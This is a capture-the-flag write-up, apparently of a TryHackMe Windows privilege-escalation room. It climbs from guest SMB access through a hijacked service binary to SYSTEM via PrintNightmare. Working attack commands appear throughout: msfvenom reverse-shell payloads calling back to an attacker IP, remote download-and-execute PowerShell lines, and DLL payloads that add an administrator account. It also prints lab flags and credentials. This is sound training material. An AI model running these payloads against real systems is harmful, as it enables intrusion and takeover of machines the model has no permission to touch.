@@ -1,0 +1,220 @@
+## Overview
+
+Windows Jump is a premium TryHackMe room focused on Windows privilege escalation. The goal was to climb a four-step chain — guest → thmuser → notadmin → svcadmin → SYSTEM — collecting a flag at each stage. The lab machine ran Windows Server 2019 (build 10.0.17763.1821) and was accessible over a VPN at 10.145.148.133 (the machine was reset once during the session, originally at 10.144.142.39).
+
+**Escalation chain:**
+
+- Flag 1: SMB guest share → thmuser credentials
+- Flag 2: notadmin Desktop (Winlogon stored credentials — skipped initially, read as admin at the end)
+- Flag 3: THMSvc service binary hijack → svcadmin shell
+- Flag 4: PrintNightmare (CVE-2021-34527) → SYSTEM
+
+## Reconnaissance
+
+I started with a full TCP port scan:
+
+```
+nmap -sC -sV -p- 10.145.148.133
+```
+
+The results pointed immediately at a Windows box with SMB and RDP exposed:
+
+| Port | Service |
+| --- | --- |
+| 135 | msrpc |
+| 139 | netbios-ssn |
+| 445 | microsoft-ds (SMB) |
+| 3389 | ms-wbt-server (RDP) |
+
+With SMB open and no web services in sight, SMB enumeration was the obvious next step.
+
+## Flag 1 — SMB Credentials
+
+I listed shares anonymously:
+
+```
+smbclient -L //10.145.148.133 -N
+```
+
+Three shares came back: `ADMIN$`, `C$`, and `Public`. The first two required admin credentials, but `Public` accepted a null/guest session:
+
+```
+smbclient //10.145.148.133/Public -N
+```
+
+Inside was a single file: `welcome.txt`. Downloading and reading it revealed plaintext credentials:
+
+```
+thmuser:Password1!
+```
+
+The flag was embedded in the share name hint — credentials stored in an SMB share anyone can read without a password.
+
+**Flag 1:** `THM{5mb_cr3d5_1n_th3_5h4r3}`
+
+## Foothold: RDP as thmuser
+
+With valid credentials in hand I RDP'd into the machine:
+
+```
+xfreerdp /v:10.145.148.133 /u:thmuser /p:'Password1!' /cert:ignore
+```
+
+This gave me an interactive desktop session. From here I opened a PowerShell window and started enumerating the host.
+
+## Enumeration as thmuser
+
+The first thing I checked was what thmuser could actually do:
+
+```powershell
+whoami /all
+```
+
+thmuser was a standard limited user — no interesting privileges, no admin group membership. I then looked at running services to see what was running under elevated accounts:
+
+```powershell
+wmic service list brief | findstr /i "running"
+```
+
+One service stood out: `THMSvc`, running as `.\ svcadmin`. That implied svcadmin was a local account with enough privilege to run a service. I checked the ACL on the service binary:
+
+```
+icacls C:\Windows\THMSVC\svc.exe
+```
+
+The output showed `Everyone:(F)` — full control for everyone. Any user on the system, including thmuser, could overwrite the binary. That was the path forward.
+
+## Service Binary Hijack → svcadmin (Flag 3)
+
+The plan was to replace `svc.exe` with a malicious binary. I started with a straightforward meterpreter payload:
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.131.46 LPORT=5555 -f exe -o /tmp/shell.exe
+```
+
+**Dead end — single-stage payload:** My first attempt was to put the meterpreter payload directly in as `svc.exe`. The service started, a session opened, but it died within 30 seconds. The Windows Service Control Manager (SCM) expects a service binary to call `SetServiceStatus` within its startup timeout; when it doesn't, SCM kills the process. Meterpreter never does that.
+
+**Fix — two-stage payload:** The solution was to decouple the launcher from the meterpreter process. I created a second binary that does nothing but spawn `shell.exe` as a detached child process and immediately return:
+
+```bash
+msfvenom -p windows/x64/exec CMD='cmd.exe /c start /b C:\share\shell.exe' -f exe -o /tmp/svc.exe
+```
+
+The launcher (`svc.exe`) returns control to SCM immediately, satisfying the timeout. The detached `shell.exe` process lives on independently as svcadmin.
+
+I also hit an early problem with conflicting listeners — netcat was still holding port 4444 open from a previous attempt, so msfconsole's meterpreter handler couldn't bind it. I killed both (`pkill nc && pkill msfconsole`) and switched to port 5555 exclusively in msfconsole.
+
+With the handler running, I uploaded `shell.exe` to `C:\share\` and replaced `svc.exe`:
+
+```powershell
+Invoke-WebRequest http://192.168.131.46:8080/shell.exe -OutFile C:\share\shell.exe
+Invoke-WebRequest http://192.168.131.46:8080/svc.exe -OutFile C:\Windows\THMSVC\svc.exe
+net start THMSvc
+```
+
+A meterpreter session came back as `PRIVESC\svcadmin`. I navigated to the Desktop and read the flag:
+
+```
+type C:\Users\svcadmin\Desktop\flag3.txt
+```
+
+**Flag 3:** `THM{s3rv1c3_b1n4ry_h1j4ck3d}`
+
+## Enumeration as svcadmin
+
+The first thing I checked as svcadmin was privileges:
+
+```
+whoami /priv
+```
+
+The token was stripped — service tokens on Windows often have `SeImpersonatePrivilege` and `SeAssignPrimaryTokenPrivilege` removed unless the service is explicitly granted them. svcadmin's token had neither, which ruled out most of the standard escalation techniques:
+
+- **getsystem (Metasploit):** All three techniques failed — named pipe impersonation and token duplication both require `SeImpersonatePrivilege` or `SeDebugPrivilege`.
+- **Potato attacks (JuicyPotato, RoguePotato):** Same requirement — need `SeImpersonatePrivilege`.
+- **AlwaysInstallElevated:** Both HKCU and HKLM registry keys were absent or set to 0.
+- **Writable HKLM service keys:** Denied.
+- **SAM/SYSTEM backup files:** Not found under `C:\Windows\Repair\` or `C:\Windows\System32\config\RegBack\`.
+- **Unattend files:** Not found.
+- **Scheduled task creation:** Access denied — svcadmin lacked the right to create tasks.
+- **notadmin credentials:** Tried `Password1!` via `net use` — Error 86 (wrong password).
+
+What I did find: the Windows build was `10.0.17763.1821` — build 1821 corresponds to the March 2021 cumulative update, well before the July 2021 PrintNightmare patches. And the Print Spooler service was running (`sc query Spooler` → STATE: 4 RUNNING). That made CVE-2021-34527 viable.
+
+## PrintNightmare → SYSTEM (Flag 4)
+
+PrintNightmare (CVE-2021-34527) exploits the Windows Print Spooler by injecting a malicious DLL into the Spooler process, which runs as SYSTEM. It does not require `SeImpersonatePrivilege`, making it ideal here.
+
+**Dead end 1 — Metasploit module missing:** I tried `use exploit/windows/local/cve_2021_1675_printnightmare` in msfconsole. The module didn't exist in this version of Metasploit. I switched to the manual PowerShell approach.
+
+I downloaded calebstewart's Invoke-Nightmare PoC on Kali:
+
+```bash
+wget https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/main/CVE-2021-1675.ps1 -O /tmp/Invoke-Nightmare.ps1
+```
+
+**Dead end 2 — `&&` not parsed by exec payload:** My first DLL was built with:
+
+```bash
+msfvenom -p windows/x64/exec CMD="net user pwned Password1! /add && net localgroup administrators pwned /add" -f dll -o /tmp/nightmare.dll
+```
+
+The `windows/x64/exec` payload calls `WinExec()`, which does not invoke `cmd.exe` — it passes the CMD string directly to the OS. `&&` is a cmd.exe shell operator, so both commands were concatenated into one broken string. The user was never created.
+
+**Dead end 3 — SMB guest access blocked:** I rebuilt the DLL wrapping the command in `cmd /c`:
+
+```bash
+msfvenom -p windows/x64/exec CMD='cmd /c "net user pwned Password1 /add & net localgroup administrators pwned /add"' -f dll -o /tmp/nightmare2.dll
+```
+
+I set up an Impacket SMB server to serve the DLL (`impacket-smbserver share /tmp -smb2support`), but when I tested the UNC path from the target, Windows refused with: *"You can't access this shared folder because your organization's security policies block unauthenticated guest access."* Windows 10 1709+ blocks null SMB sessions by default. I restarted the SMB server with credentials:
+
+```bash
+impacket-smbserver share /tmp -smb2support -username user -password user
+```
+
+And authenticated from the target:
+
+```
+net use \\192.168.131.46\share /user:user user
+```
+
+**Fix — Invoke-Nightmare's built-in user creation:** Rather than fighting with the DLL loading, I realized Invoke-Nightmare has a `-NewUser` / `-NewPassword` flag that generates the payload entirely in memory — no external DLL required. From the svcadmin meterpreter session:
+
+```
+execute -f powershell.exe -a "-ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://192.168.131.46:8080/Invoke-Nightmare.ps1'); Invoke-Nightmare -DriverName 'Xerox' -NewUser 'pwned' -NewPassword 'Password1'\"" -H
+```
+
+The Spooler loaded the in-memory payload as SYSTEM and created the user. `net user` confirmed `pwned` existed and `net localgroup administrators` showed it in the admin group.
+
+I RDP'd in as `pwned`, opened an elevated CMD, and read the flag:
+
+```
+type C:\flag4.txt
+```
+
+**Flag 4:** `THM{t4sk_wr1t3_t0_SYST3M}`
+
+## Flag 2 — notadmin Desktop
+
+As a local administrator, I could read any user's files without needing their password. From the elevated CMD as `pwned`:
+
+```
+type C:\Users\notadmin\Desktop\flag2.txt
+```
+
+**Flag 2:** `THM{w1nl0g0n_cr3d5_3xp0s3d}`
+
+## Intended Path: thmuser → notadmin
+
+Flag 2's name — `w1nl0g0n_cr3d5_3xp0s3d` — reveals the path I skipped. The intended thmuser → notadmin escalation was reading stored autologon credentials from the Winlogon registry key:
+
+```
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+```
+
+Many systems configured for automatic login store the password in plaintext under `DefaultPassword`. If notadmin's credentials were stored there, reading this key as thmuser (which any standard user can do) would have given us the password directly.
+
+I had queried this key during enumeration as svcadmin but not as thmuser — and the output didn't surface a `DefaultPassword` value at that point. In retrospect, this key should be checked early as thmuser. The value may also appear under `DefaultUserName` to confirm which account is configured for autologon.
+
+We reached the same flags via the longer route (service binary hijack → PrintNightmare → local admin), but in a real engagement the Winlogon key is a quick, low-noise check worth doing right after gaining any user foothold.
